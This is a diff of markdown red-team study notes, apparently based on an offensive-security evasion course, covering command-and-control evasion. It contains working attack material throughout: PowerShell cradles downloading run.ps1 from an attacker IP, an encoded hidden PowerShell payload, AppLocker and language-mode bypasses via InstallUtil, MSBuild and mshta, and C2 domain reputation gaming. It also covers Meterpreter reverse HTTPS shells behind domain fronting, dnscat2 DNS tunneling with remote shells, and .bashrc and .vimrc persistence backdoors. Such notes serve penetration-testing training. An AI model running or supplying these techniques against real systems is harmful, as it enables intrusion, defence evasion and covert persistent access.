@@ -293,13 +293,13 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 
 ## PowerShell Proxy-Aware Communication
 
-View the proxy settings using the **GetProxy** method by specifying the URL to test against.
+View the proxy settings
 
 ```pwsh
 [System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.119.120/run.ps1")
 ```
 
-Since the proxy settings are configured dynamically through the proxy property, we can remove them by simply creating an empty object
+Remove proxy settings by simply creating an empty object
 
 ```pwsh
 $wc = new-object system.net.WebClient
@@ -307,11 +307,13 @@ $wc.proxy = $null
 $wc.DownloadString("http://192.168.119.120/run.ps1")
 ```
 
-In some environments, network communications not going through the proxy will get blocked at an edge firewall. Otherwise, we could bypass any monitoring that processes network traffic at the proxy.
+In some environments, network communications not going through the proxy will get blocked at an edge firewall.
 
 ## Fiddling With The User-Agent
 
-The Net.WebClient PowerShell download cradle does not have a default User-Agent set => the session will stand out from other legitimate traffic => Customize User-Agent
+The Net.WebClient PowerShell download cradle does not have a default User-Agent set => The session will stand out from other legitimate traffic.
+
+Customize User-Agent
 
 ```pwsh
 $wc = new-object system.net.WebClient
@@ -321,8 +323,6 @@ $wc.DownloadString("http://192.168.119.120/run.ps1")
 
 ## Give Me A SYSTEM Proxy
 
-A PowerShell download cradle running in **SYSTEM** integrity level context does not have a proxy configuration set and may fail to call back to our C2 infrastructure.
-
 * -s: run it as SYSTEM
 * -i: make it interactive with the current desktop
 
@@ -330,23 +330,20 @@ A PowerShell download cradle running in **SYSTEM** integrity level context does 
 PsExec.exe -s -i C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
 ```
 
-To run our session through a proxy, we must create a proxy configuration for the built-in SYSTEM account, i.e., copy a configuration from a standard user account on the system.
+A PowerShell download cradle running in **SYSTEM** integrity level context does not have a proxy configuration set and may fail to call back to our C2 infrastructure.
+
+=> create a proxy configuration for the built-in SYSTEM account, i.e., copy a configuration from a standard user account on the system.
 
 Proxy settings for each user are stored in the registry at the following path:
 `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings`
 
 When navigating the registry, the HKEY_CURRENT_USER registry hive is mapped according to the user trying to access it, but when navigating the registry as SYSTEM, no such registry hive exists.
 
-The **HKEY_USERS** registry hive always exists and contains the content of all user HKEY_CURRENT_USER registry hives split by their respective SIDs.
-
-As part of our download cradle, we can use PowerShell to resolve a registry key. But the HKEY_USERS registry hive is not automatically mapped. 
-=> Map the HKEY_USERS registry hive with the **New-PSDrive**
+The **HKEY_USERS** registry hive always exists and contains the content of all user HKEY_CURRENT_USER registry hives split by their respective SIDs. Map the HKEY_USERS registry hive with the **New-PSDrive**
 
 The HKEY_USERS hive contains the hives of all users on the computer, including SYSTEM and other local service accounts, which we want to avoid.
 
-The registry hives are divided and named after the SIDs of existing users and there is a specific pattern.
-
-Any SID starting with "**S-1-5-21-**" is a user account exclusive of built-in accounts.
+The registry hives are divided and named after the SIDs of existing users. Any SID starting with "**S-1-5-21-**" is a user account exclusive of built-in accounts.
 
 To obtain a valid user hive, loop through all top level entries of the HKEY_USERS until we find one with a matching SID. Once we find one, we can filter out the lower 10 characters leaving only the SID, while omitting the HKEY_USERS string.
 
@@ -2141,11 +2138,8 @@ $EncodedText
 
 ```pwsh
 $payload = "powershell -exec bypass -nop -w hidden -e <base64-encoded command>"
-
 # $payload = "winmgmts:"
-
 # $payload = "Win32_Process"
-
 # $payload = "Report.doc"
 
 [string]$output = ""
@@ -2580,17 +2574,19 @@ type C:\Tools\test.txt
 
 ### PowerShell CLM Bypass
 
-Leverage **InstallUtil**, a command-line utility that allows us to install and uninstall server resources by executing the installer components in a specified assembly.
+Command-line utility **InstallUtil** allows us to install and uninstall server resources by executing the installer components in a specified assembly.
 
-=> abuse it to execute arbitrary C# code by putting the code inside either the install or uninstall methods of the installer class.
+=> Abuse it to execute arbitrary C# code by putting the code inside either the install or uninstall methods of the installer class.
 
-We are only going to use the uninstall method since the install method requires administrative privileges to execute.
+Only use the uninstall method since the install method requires administrative privileges to execute.
 
 The System.Configuration.Install namespace is missing an assembly reference in Visual Studio.
 
-=> add this by right-clicking on **References** in the Solution Explorer and choosing **Add References**.... > navigate to the **Assemblies** menu on the left-hand side and scroll down to **System.Configuration.Install**.
+=> Add this by right-clicking on **References** in the Solution Explorer and choosing **Add References**.... > navigate to the **Assemblies** menu on the left-hand side and scroll down to **System.Configuration.Install**.
 
-Enabled AppLocker DLL rules to block untrusted DLLs. Leverage InstallUtil to bypass AppLocker and revive the powerful reflective DLL injection technique.
+AppLocker DLL rules are enabled to block untrusted DLLs
+
+=> Leverage InstallUtil to bypass AppLocker and revive the powerful reflective DLL injection technique.
 
 ```csharp
 using System;
@@ -2659,7 +2655,7 @@ C:\Users\student>bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\us
 
 ### Microsoft.Workflow.Compiler
 
-Craft a file named `test.txt` containing C# code, which implements a class that inherits from the **Activity** class and has a constructor.
+`test.txt`
 
 ```csharp
 using System;
@@ -2671,9 +2667,7 @@ public class Run : Activity{
 }
 ```
 
-The file path must be inserted into the XML document named `run.xml` along with compiler parameters organized in a serialized format.
-
-Create the correctly-serialized XML format.
+Create the correctly-serialized XML format in a file named `run.xml`
 
 ```pwsh
 $workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
@@ -2691,11 +2685,13 @@ Move-Item $tmp $output
 $Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(“student”,”FullControl”,”none”,”none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl
 ```
 
+`results.xml` is an arbitrary file to store the result
+
 ```bat
 C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
 ```
 
-The downside is that we must provide both the XML file and the C# code file on disk, and the C# code file will be compiled temporarily to disk as well.
+Downside: We must provide both the XML file and the C# code file on disk, and the C# code file will be compiled temporarily to disk as well.
 
 ### MSbuild
 
@@ -2703,7 +2699,7 @@ The downside is that we must provide both the XML file and the C# code file on d
 
 Executes the code in a project file using `msbuild.exe`.
 
-The default C# project example file (`T1127.001.csproj`) will simply print "Hello From a Code Fragment" and "Hello From a Class." to the screen.
+`T1127.001.csproj`
 
 ```xml
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
@@ -2754,15 +2750,15 @@ The default C# project example file (`T1127.001.csproj`) will simply print "Hell
 </Project>
 ```
 
+The default C# project example file above will simply print "Hello From a Code Fragment" and "Hello From a Class." to the screen.
+
 ```bat
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe T1127.001.csproj
 ```
 
 ## Bypassing AppLocker with JScript
 
-The MSHTA client side attack vector works best against Internet Explorer. As Internet Explorer becomes less-used, this vector will become less relevant, but we'll reinvent it to bypass AppLocker and execute arbitrary Jscript code.
-
-Microsoft HTML Applications (MSHTA) work by executing `.hta` files with the native `mshta.exe` application. HTML Applications include embedded Jscript or VBS code that is parsed and executed by mshta.exe.
+HTML Applications include embedded Jscript or VBS code that is parsed and executed by mshta.exe.
 
 Since mshta.exe is located in `C:\Windows\System32` and is a signed Microsoft application, it is commonly whitelisted.
 
@@ -2788,9 +2784,7 @@ self.close();
 
 Shortcut target
 
-```
-C:\Windows\System32\mshta.exe http://192.168.119.120/test.hta
-```
+`C:\Windows\System32\mshta.exe http://192.168.119.120/test.hta`
 
 ### XSL Transform
 
@@ -2835,7 +2829,7 @@ Switch to an OpenDNS server
 sudo bash -c "echo nameserver 208.67.222.222 > /etc/resolv.conf"
 ```
 
-Register a new domain, but it may be categorized as a **Newly Seen Domain** => detrimental to the reputation score, since malware authors often use brand new domains.
+Register a new domain: It may be categorized as a **Newly Seen Domain** => detrimental to the reputation score, since malware authors often use brand new domains.
 
 Domains in this category are often **less than 1 week old** and are relatively unused, lacking inquiries and traffic.
 
@@ -2845,43 +2839,45 @@ Make sure its **domain category** matches what the client allows. E.g., the "web
 
 Pre-populate a web site on our domain with seemingly harmless content (like a cooking blog) to earn a harmless category classification.
 
-Subscribe to **domain categorization services** (like OpenDNS) so we can submit our own domain classifications. Even if our domain has been categorized as malicious, we can easily host a legitimate-looking website on the domain and request re-categorization.
+Subscribe to **domain categorization services** (like OpenDNS) to submit our own domain classifications. Even if our domain has been categorized as malicious, we can easily host a legitimate-looking website on the domain and request re-categorization.
 
 Submit the domain for a community review if voting is not available or if we would like to suggest a different category.
  
-Make the domain name itself appear legitimate => **typo-squatting**
+Make the domain name itself appear legitimate: **typo-squatting**
 
-Finally, be aware of the status of the **IP address** of our C2 server. If the IP has been flagged as malicious, some defensive solutions may block the traffic. This is especially common on **shared hosting sites** in which one IP address hosts multiple websites. If one site on the shared host ever contained a browser exploit or was ever used in a watering hole malware campaign, the shared host may be flagged. Subsequently, every host that shares that IP may be flagged as well, and our C2 traffic may be blocked.
+Be aware of the status of the **IP address** of our C2 server. If the IP has been flagged as malicious, some defensive solutions may block the traffic. This is especially common on **shared hosting sites** in which one IP address hosts multiple websites. If one site on the shared host ever contained a browser exploit or was ever used in a watering hole malware campaign, the shared host may be flagged. Subsequently, every host that shares that IP may be flagged as well.
 
 Use a variety of lookup tools, like Virustotal and IPVoid sites to check the status of our C2 IP address before an engagement.
 
-Have several domains prepared in advance so we can swap them out as needed during an engagement.
+Have several domains prepared in advance so we can swap them out as needed.
 
 ## Web Proxies
 
 [Symantec Corporation](https://sitereview.bluecoat.com/)
 
-When dealing with proxy servers, ensure that our payload is **proxy-aware**. When our payload tries to connect back to the C2 server, it must detect local proxy settings, and implement those settings instead of trying to connect to the given domain directly.
+When our payload tries to connect back to the C2 server, it must detect local proxy settings, and implement those settings instead of trying to connect to the given domain directly.
+
 => Meterpreter's HTTP/S payload is proxy-aware (thanks to the InternetSetOptionA API).
 
-Ensure that the domain and URL are clean and that our C2 server is safely **categorized** as defined by our client's policy rules. 
+Ensure that the domain and URL are clean and that our C2 server is safely **categorized** as defined by our client's policy rules.
 
 If the client has deployed a URL verification or categorization system, we should factor their policy settings into our bypass strategy.
 
 If our C2 server domain is uncategorized, we should follow the prompts to categorize it according to the company's allowed use policy, since an unnamed domain will likely be flagged.
 
-We could also grab a seemingly-safe domain by hosting our C2 in a **cloud service or Content Delivery Network (CDN)**, which auto-assigns a generic domain. E.g., `cloudfront.net`, `wordpress.com`, or `azurewebsites.net`. These types of domains are often auto-allowed since they are used by legitimate websites and hosting services.
+Grab a seemingly-safe domain by hosting our C2 in a **cloud service or Content Delivery Network (CDN)**, which auto-assigns a generic domain. E.g., `cloudfront.net`, `wordpress.com`, or `azurewebsites.net`. These types of domains are often auto-allowed since they are used by legitimate websites and hosting services.
 
-Consider the traces our C2 session will leave in the proxy logs. E.g., instead of simply generating custom TCP traffic on ports 80 or 443, our session should **conform to HTTP protocol standards**.
-=> many framework payloads, including Metasploit's Meterpreter, follow the standards as they use HTTP APIs like HttpOpenRequestA.
+Consider the traces our C2 session will leave in the proxy logs. E.g., Instead of simply generating custom TCP traffic on ports 80 or 443, our session should **conform to HTTP protocol standards**.
 
-Set our **User-Agent** to a browser type that is permitted by the organization. For example, if we know that the organization we are targeting uses Microsoft Windows with Edge, we should set it accordingly. E.g., a User-Agent for Chrome running on macOS will likely raise suspicion or might be blocked.
+=> Many framework payloads, including Metasploit's Meterpreter, follow the standards as they use HTTP APIs like HttpOpenRequestA.
+
+Set our **User-Agent** to a browser type that is permitted by the organization. E.g., if the organization uses Microsoft Windows with Edge, we should set it accordingly. A User-Agent for Chrome running on macOS will likely raise suspicion or might be blocked.
 
 To determine an allowed User-Agent string, consider social engineering or sniff HTTP packets from our internal point of presence.
 
 Use a site like `useragentstring.com` to build the string or choose from a variety of user-supplied strings.
 
-We can set our custom User-Agent in Meterpreter with the **HttpUserAgent** advanced configuration option.
+Set our custom User-Agent in Meterpreter with the **HttpUserAgent** advanced configuration option.
 
 ## IDS and IPS Sensors
 
@@ -2889,19 +2885,21 @@ We can set our custom User-Agent in Meterpreter with the **HttpUserAgent** advan
 
 Norton HIPS detects the standard Meterpreter HTTPS certificate. Certificates are used to ensure (or certify) the identity of a domain and encrypt network traffic through a variety of cryptographic mechanisms.
 
-Normally, certificates are issued by trusted authorities called Certificate Authorities (CA), which are well-known. For example, the CA trusted root certificates are pre-installed on most OS, which streamlines validation.
+Normally, certificates are issued by trusted authorities called Certificate Authorities (CA), which are well-known. E.g., the CA trusted root certificates are pre-installed on most OS, which streamlines validation.
 
-Norton may be flagging this because it's a self-signed certificate => use a real SSL certificate, which requires that we own that domain. => Obtain a signed, valid certificate, perhaps from a service provider like **Let's Encrypt**.
+Norton may be flagging this because it's a self-signed certificate => use a real SSL certificate, which requires that we own that domain => Obtain a signed, valid certificate, perhaps from a service provider like **Let's Encrypt**.
 
-Consider that self-signed certificates are somewhat common for non-malicious use though. => Norton contains signatures for the data present in Meterpreter's randomized certificates. 
+Self-signed certificates are somewhat common for non-malicious use though => Norton contains signatures for the data present in Meterpreter's randomized certificates. 
 
-Create our own self-signed certificate, customizing some of its fields in an attempt to bypass those signatures. There are several approaches we could consider:
-
+To create our own self-signed certificate, customize some of its fields (If the certificate is passing through HTTPS inspection, the traffic might flag because of an untrusted certificate.)
 * Generate a self-signed certificate that matches a given domain with Metasploit's **impersonate_ssl** auxiliary module. This module will create a self-signed certificate whose metadata matches the site we are trying to impersonate.
 
 * Manually create a self-signed certificate with `openssl`, which allows us full control over the certificate details.
 
-We don't need to own a domain for this approach but if the certificate is passing through HTTPS inspection, the traffic might flag because of an untrusted certificate.
+```bash
+openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
+cat priv.key cert.crt > nasa.pem
+```
 
 * req: Create a self-signed certificate.
 * -new: Generate a new certificate.
@@ -2910,12 +2908,9 @@ We don't need to own a domain for this approach but if the certificate is passin
 * -out cert.crt: Output file for the certificate.
 * -keyout priv.key: Output file for the private key.
 
-```bash
-openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
-cat priv.key cert.crt > nasa.pem
-```
+Change the CipherString in the `/etc/ssl/openssl.cnf` config file or our reverse HTTPS shell will not work properly.
 
-We also must change the CipherString in the `/etc/ssl/openssl.cnf` config file or our reverse HTTPS shell will not work properly. We will remove the "@SECLEVEL=2" string, as the SECLEVEL option limits the usable hash and cypher functions in an SSL or TLS connection. We'll set this to "DEFAULT", which allows all.
+Remove the "@SECLEVEL=2" string, as the SECLEVEL option limits the usable hash and cypher functions in an SSL or TLS connection, i.e. set this to "DEFAULT", which allows all.
 
 `CipherString=DEFAULT@SECLEVEL=2` > `CipherString=DEFAULT`
 
@@ -2937,32 +2932,28 @@ exploit
 
 ## Full Packet Capture Devices
 
-Full packet capture devices typically sit on a network tap, which will capture the traffic. These devices are typically used during post-incident forensic investigations.
+Full packet capture devices typically sit on a network tap, which will capture the traffic. And are typically used during post-incident forensic investigations.
 
 RSA's Netwitness is a common enterprise-level full packet capture system and Moloch is an alternative free open source alternative.
 
 ## HTTPS Inspection
 
-If we are using HTTPS, we must simply assume that our traffic will be inspected and try to keep a low profile.
+If we are using HTTPS, simply assume that our traffic will be inspected and try to keep a low profile.
 
 => Abort a payload if we suspect that it is being inspected. 
 
-Using **TLS Certificate Pinning** in Meterpreter, we can specify the certificate that will be trusted. Meterpreter will then compare the hash of the certificates and if there is a mismatch, it will terminate itself. This can be controlled by setting the **StagerVerifySSLCert** option to "true" and configuring **HandlerSSLCert** with the certificate we trust and want to use.
+Using **TLS Certificate Pinning** in Meterpreter, specify the certificate that will be trusted. Meterpreter will then compare the hash of the certificates and if there is a mismatch, it will terminate itself. This can be controlled by setting the **StagerVerifySSLCert** option to "true" and configuring **HandlerSSLCert** with the certificate we trust and want to use.
 
 Also try to **categorize** the target domain of our traffic to reduce the likelihood of inspection. Some categories, like "banking", are usually not subject to inspection because of privacy concerns.
 
-If we can categorize our domain to an accepted category, we may be able to bypass HTTPS inspection and, by extension, bypass other detection systems as well since our traffic is encrypted.
-
 ## Domain Fronting
 
-Domain fronting was originally designed to circumvent Internet censorship systems.
+Large Content Delivery Networks (CDN) can be difficult to block or filter on a granular basis. Depending on the feature set supported by a CDN provider, domain fronting allows us to fetch arbitrary website content from a CDN, even though the initial TLS session is targeting a different domain. This is possible as the TLS and the HTTP session are handled independently.
 
-Large Content Delivery Networks (CDN) can be difficult to block or filter on a granular basis. Depending on the feature set supported by a CDN provider, domain fronting allows us to fetch arbitrary website content from a CDN, even though the initial TLS session is targeting a different domain. This is possible as the TLS and the HTTP session are handled independently. E.g., we can initiate the TLS session to `www.example1.com` and then get the contents of `www.example2.com`.
+E.g., we can initiate the TLS session to `www.example1.com` and then get the contents of `www.example2.com`.
 
-With the advent of **virtual hosting**, multiple web sites associated with different domains could be hosted on a single machine, i.e. from a single IP address. The key to this functionality is the **request HOST header**, which specifies the **target domain name**, and optionally the port on which the web server is listening for the specified domain.
+With **virtual hosting**, multiple web sites associated with different domains could be hosted on a single machine, i.e. from a single IP address. The key to this functionality is the **request HOST header**, which specifies the **target domain name**, and optionally the port on which the web server is listening for the specified domain.
  
-After the DNS lookup is performed by the connecting client, the domain information is lost. The server will only see the IP address where the client tries to connect (which is its IP). Because of this, the target domain is represented in the HTTP request.
-
 On the hosting server itself, the Host header maps to a value in one of the web server's configuration files.
 
 E.g., NGINX configuration shown below
@@ -2984,24 +2975,23 @@ server {
 ```
 
 **server_name** lists the available domain names this particular configuration applies to.
+
 **root** field specifies what content is served for that domain name.
-=> a server can host many websites from a single host through multiple domain-centric configuration files.
+=> A server can host many websites from a single host through multiple domain-centric configuration files.
 
 When a client connects to a server that runs TLS, the server must also determine which certificate to send in the response based on the client's request.
 
 Since the HTTP Host header is only available after the secure channel has been established, it can't be used to specify the target domain. Instead, the TLS **Server Name Indication** (SNI) field, which can be set in the "TLS Client Hello" packet during the TLS negotiation process, is used to specify the target domain and therefore the certificate that is sent in response.
  
-In response to this, the "TLS Server Hello" packet contains the certificate for the domain that was indicated in the client request SNI field.
- 
-=> If `www.example2.com` is a blocked domain, but `www.example1.com` is not, we can make an HTTPS connection to a server and set the SNI to indicate that we are accessing `www.example1.com`. Once the TLS session is established and we start the HTTP session (over TLS), we can specify a different domain name in the Host header, for example `www.example2.com`. This will cause the webserver to serve content for that website instead. If our target is not performing HTTPS inspection, it will only see the initial connection to `www.example1.com`, unaware that we were connecting to `www.example2.com`.
+=> If `www.example2.com` is a blocked domain, but `www.example1.com` is not, make an HTTPS connection to a server and set the SNI to indicate that we are accessing `www.example1.com`. Once the TLS session is established and we start the HTTP session (over TLS), we can specify a different domain name in the Host header, for example `www.example2.com`. This will cause the webserver to serve content for that website instead. If our target is not performing HTTPS inspection, it will only see the initial connection to `www.example1.com`, unaware that we were connecting to `www.example2.com`.
 
-Tie this approach to Content Delivery Networks (CDN). On a larger scale, a CDN provides geographically-optimized web content delivery. CDN endpoints cache and serve the actual website content from multiple sources, and the HTTP request Host header is used to differentiate this content. It can serve us any resource (typically a website) that is being hosted on the same CDN network.
+On a larger scale, a CDN provides geographically-optimized web content delivery. CDN endpoints cache and serve the actual website content from multiple sources, and the HTTP request Host header is used to differentiate this content. It can serve us any resource (typically a website) that is being hosted on the same CDN network.
 
 E.g., `www.example.com` will point to the CDN endpoint's domain name (e.g.: `something.azureedge.net`) through DNS Canonical Name (CNAME) records. When a client looks up `www.example.com`, the DNS will recursively lookup `something.azureedge.net`, which will be resolved by Azure. 
 
-=> traffic will be directed to the CDN endpoint rather than the real server. Since CDN endpoints are used to serve content from multiple websites, the returned content is based on the Host header.
+=> Traffic will be directed to the CDN endpoint rather than the real server. Since CDN endpoints are used to serve content from multiple websites, the returned content is based on the Host header.
 
-E.g., we have a CDN network that is caching content for `good.com`. This endpoint has a domain name of `cdn1111.someprovider.com`.
+E.g., A CDN network that is caching content for `good.com`. This endpoint has a domain name of `cdn1111.someprovider.com`.
 
 We'll create a CDN endpoint that is proxying or caching content to `malicious.com`. This new endpoint will have a domain name of `cdn2222.someprovider.com`, which means if we browse to this address, we eventually access `malicious.com`.
 
@@ -3015,16 +3005,14 @@ Assuming that `malicious.com` is a blocked domain and `good.com` is an allowed d
 6. The primary DNS sends the reply to the client.
 7. The client initiates a TLS session to domain `good.com` to the CDN endpoint.
 8. The CDN endpoint serves the certificate for `good.com`.
-9. The client asks for the `cdn2222.someprovider.com resource`.
+9. The client asks for the `cdn2222.someprovider.com` resource.
 10. The CDN endpoint serves the contents of `malicious.com`.
 
 If we are using HTTPS and no inspection devices are present, this primarily appears to be a connection to `good.com` because of the initial DNS request and the SNI entry from the TLS Client Hello.
 
-Even in an environment that uses HTTPS filtering, we can use this technique in various ways, such as to **bypass DNS filters**.
+Even in an environment that uses HTTPS filtering, we can use this technique to **bypass DNS filters**.
 
 Some CDN providers, like Google and Amazon, will **block requests if the host in the SNI and the Host headers don't match** => Microsoft Azure.
-
-In summary, this allows us to fetch content from sites that might be blocked otherwise and also allows us to hide our traffic.
 
 ### Domain Fronting with Azure CDN
 
@@ -3041,9 +3029,9 @@ Set up a CDN in Azure to proxy requests to this domain
 
 Caching will break our C2 channel, especially our reverse shells since they are not static and each request returns a unique response.
 
-To disable caching, we'll select our Endpoint and **Caching rules** > set **Caching behavior** to "Bypass cache", which will disable caching.
+To disable caching, select our Endpoint and **Caching rules** > set **Caching behavior** to "Bypass cache", which will disable caching.
 
-We can also set **Query string caching behavior** to "Bypass caching for query strings", which will prevent the CDN from caching any requests containing query strings.
+Also set **Query string caching behavior** to "Bypass caching for query strings", which will prevent the CDN from caching any requests containing query strings.
 
 On our machine, which is the destination for `meterpreter.info`, set up a simple Python HTTP and HTTPS listener to test web server functionality
 
@@ -3072,27 +3060,27 @@ curl http://offensive-security.azureedge.net
 curl -k https://offensive-security.azureedge.net
 ```
 
-Find a frontable domain
-
 ```bash
 git clone https://github.com/rvrsh3ll/FindFrontableDomains
 cd FindFrontableDomains/
 sudo ./setup.sh
 ```
 
+Find a frontable domain
+
 ```bash
 python3 FindFrontableDomains.py --domain outlook.com
 ```
 
-The output reveals over two thousand subdomains, and one of them, `assets.outlook.com`, is frontable.
+The output reveals `assets.outlook.com`, is frontable.
 
-Test the viability of the domain `assets.outlook.com`
+Test the viability of the domain
 
 ```bash
 curl --header "Host: offensive-security.azureedge.net" http://assets.outlook.com
 ```
 
-This returns a blank response because the CDN used by the `assets.outlook.com` domain is in a **different region or pricing tier**, which drastically affects our ability to use the domain for fronting.
+This returns a blank response because the CDN used by the `assets.outlook.com` domain is in a **different region or pricing tier**.
 
 ```bash
 python3 FindFrontableDomains.py --domain skype.com
@@ -3127,3 +3115,344 @@ If our target environment is not using HTTPS inspection, our HTTPS traffic will 
 Censys is a search engine similar to Shodan, searching Internet-connected devices based on their fingerprint information, like webserver type, certificate details, etc. Use this service to find Azure domain-frontable sites.
 
 ### Domain Fronting in the Lab
+
+Use the trusted `good.com` domain to reach the otherwise blocked `bad.com` domain. Our CDN hostname will be `cdn123.offseccdn.com`, which will point to the IP address of `bad.com`.
+
+Windows > Ubuntu (Snort IPS v2.9.7 + dnsmasq (DNS) + NGINX web server) > Internet (Kali)
+
+#### On Windows machine:
+
+DNS Server of the Windows machine is the Ubuntu machine
+
+#### On Ubuntu machine:
+
+`/etc/hosts`
+```
+<Ubuntu IP>     good.com
+<Kali IP>       bad.com
+<Ubuntu IP>     cdn123.offseccdn.com
+```
+
+```bash
+sudo systemctl restart dnsmasq
+sudo systemctl restart nginx
+```
+
+NGINX server is serving content for `good.com`, which is a safe domain, the traffic destined for it will be allowed through.
+
+`/etc/nginx/sites-available/good.com`
+```
+server {
+  listen 443 ssl;
+  server_name good.com;
+  ssl_certificate     good.crt;
+  ssl_certificate_key good.key;
+  location / {
+            root /var/www/good.com;
+  }
+}
+```
+
+The `bad.com` domain is blocked by Snort, which will drop all DNS queries using this snort rule (`/etc/snort/rules/local.rules`):
+
+`drop udp any any -> any 53 (msg:"VIRUS DNS query for malicious bad.com domain"; content:"|01|"; offset:2; depth:1; content:"|00 01 00 00 00 00 00|"; distance:1; within:7; content:"|03|bad|03|com"; fast_pattern; classtype:bad-unknown; sid:2013482; rev:4;)`
+
+`cdn123.offseccdn.com` represents a CDN endpoint that is serving content for `bad.com`.
+
+To represent a CDN network, we configured NGINX as a **reverse proxy** for this domain so it forwards all requests to the `bad.com` domain.
+
+The configuration file related to this domain `/etc/nginx/sites-available/cdn123.offseccdn.com`:
+
+```
+server {
+  listen 443 ssl;
+  server_name cdn123.offseccdn.com;
+  ssl_certificate     cdn.crt;
+  ssl_certificate_key cdn.key;
+
+  location / {
+         proxy_pass https://bad.com
+         proxy_ssl_verify off;
+   }
+}
+```
+
+Since we are using self-signed certificates, we also need to set **proxy_ssl_verify** to "off".
+
+Connect to the trusted `good.com` domain and use the `cdn123.offseccdn.com` domain in the HTTP Host header to access the domain `bad.com`. As both of these domains are served from the same machine (Ubuntu), the request will be forwarded to our Kali machine.
+
+#### On Kali machine:
+
+Ccreate our reverse HTTPS Meterpreter shell, where we set `good.com` as the LHOST and `cdn123.offseccdn.com` as the HttpHostHeader.
+
+```bash
+msfvenom -p windows/x64/meterpreter_reverse_https HttpHostHeader=cdn123.offseccdn.com LHOST=good.com LPORT=443 -f exe > https-df.exe
+```
+
+Configure a listener to handle this shell. Note that we will use a **stageless** payload, so we don't need to configure the **OverrideLHOST** and **OverrideRequestHost** options.
+
+```bash
+msfconsole -qx "use exploit/multi/handler;set payload windows/x64/meterpreter_reverse_https;set HttpHostHeader cdn123.offseccdn.com; set LHOST good.com;set LPORT 443;run;"
+```
+
+## DNS Tunneling
+
+In order to receive the DNS requests generated by the client, we need to register our DNS server as the **authoritative server** for a given target domain, i.e. to assign an **NS record** to our domain.
+
+=> We must purchase a domain and under its configuration, and set the **NS record** to our DNS tunnel server. This will cause the DNS server to forward all subdomain requests to our server.
+
+From the **client**, we can encapsulate data into the name field, which contains the domain name. However, since the top-level domain is fixed, we can only encapsulate data as **subdomains**. These can be up to **63 characters long** but the total length of a domain can't exceed 253 characters.
+
+From the **server** side, we can return data in a variety of fields based on the record type that was requested. An "A" record can only contain IPv4 addresses, => only store 4 bytes of information, but "TXT" records allow up to 64k.
+
+Clients will continuously poll the server for new commands because the server can't initiate connections to the client. The client will execute new commands and send the results via new query messages. Within these exchanges, we will generally **hex-encode** our data, which allows us to transfer custom data.
+
+E.g., Client polls the server via DNS TXT queries
+
+`Query: Request TXT record for "61726574686572656e6577636f6d6d616e6473.ourdomain.com"`
+
+represents the hex-encoded string of "aretherenewcommands".
+* If there is nothing to run, the server will return an empty TXT record.
+* If there are commands to execute, the server will return the hex-encoded string of the command to be executed by the client.
+
+E.g., The "hostname" command: `TXT: "686f73746e616d65"`
+
+Next, the client executes the command and captures the results. To send the results, it will generate a new DNS lookup that includes the output of the requested command. In this case, the response would include the hex-encoded hostname ("client") in the request. E.g., "636c69656e74.ourdomain.com" The client could safely use a single "A" record lookup in this case due to the short response. If the response was longer, the client would use multiple DNS queries.
+
+Proper tunneling tools account for various issues such as **DNS retransmission**, in which the client resends queries because it didn't receive an answer in time, or **DNS caching**, in which the client caches the result of DNS queries. Full-featured tools can potentially tunnel arbitrary TCP/IP traffic and can also encrypt data.
+
+### DNS Tunneling with dnscat2
+
+Windows > Ubuntu > Kali
+
+#### On Ubuntu machine:
+
+Ubuntu machine will act as the **primary DNS server**. All subdomain lookup requests for a specific domain should go to our DNS tunneling server (our Kali machine), which acts as the authoritative name server for that domain.
+
+We'll use a simple dnsmasq DNS server and configure it to forward requests. We'll use `tunnel.com` as an example domain.
+
+Edit the `/etc/dnsmasq.conf` file on the Ubuntu machine 
+
+```
+server=/tunnel.com/<Kali IP>
+server=/somedomain.com/<Kali IP>
+```
+
+```bash
+sudo systemctl restart dnsmasq
+```
+
+#### On Kali machine:
+
+```bash
+sudo apt install dnscat2
+
+dnscat2-server tunnel.com
+```
+
+#### On Windows machine:
+
+```bat
+dnscat2-v0.07-client-win32.exe tunnel.com
+```
+
+On Kali machine:
+
+```
+dnscat2> session -i 1
+command (client) 1> shell
+command (client) 1> session -i 2
+cmd.exe (client) 2> whoami
+Ctrl + Z
+```
+
+Redirecting our local port 3389 to the Windows machine's IP
+
+```
+command (client) 1> listen 127.0.0.1:3389 172.16.51.21:3389
+```
+
+# Linux Post-Exploitation
+
+## User Configuration Files
+
+`.bash_profile` is executed when logging in to the system initially. This happens when logging in to the machine itself, via a serial console or SSH.
+
+`.bashrc` is executed when a new terminal window is opened from an existing login session or when a new shell instance is started from an existing login session.
+
+=> Modify `.bash_profile` or `.bashrc` to set environment variables or **load scripts** when a user initially logs in to a system.
+
+=> Maintain persistence, escalate privileges, or engage in other offensive activity.
+
+```bash
+echo "touch /tmp/bashtest.txt" >> ~/.bashrc
+```
+
+### VIM Config Simple Backdoor
+
+To print a message to the user, use the following command in the `.vimrc` file or within the editor
+
+`:echo "this is a test"`
+
+Since VIM has access to the shell environment's variables, we can use $USER to get the username or $UID to get the user's ID number.
+
+The commands specified in the `.vimrc` file are executed when VIM is launched. By editing this file, we can cause a user's VIM session to perform unintended actions on their behalf when VIM is run.
+
+To run **shell commands** from within the config file
+
+`!touch /tmp/test.txt`
+
+By default, VIM allows shell commands but some hardened environments have VIM configured to restrict them. 
+
+Calling VIM with the `-Z` parameter on the command line, then attempting to run a shell command will result in an error message indicating that such commands are not allowed.
+
+Putting our commands directly into the user's `.vimrc` file isn't particularly stealthy, as a user modifying their own settings may accidentally discover the changes we've made.
+
+=> "Source" a shell script using the bash `source` command. This loads a specified shell script and runs it.
+
+"Import" other VIM configuration files into the user's current config with the `:source` command.
+
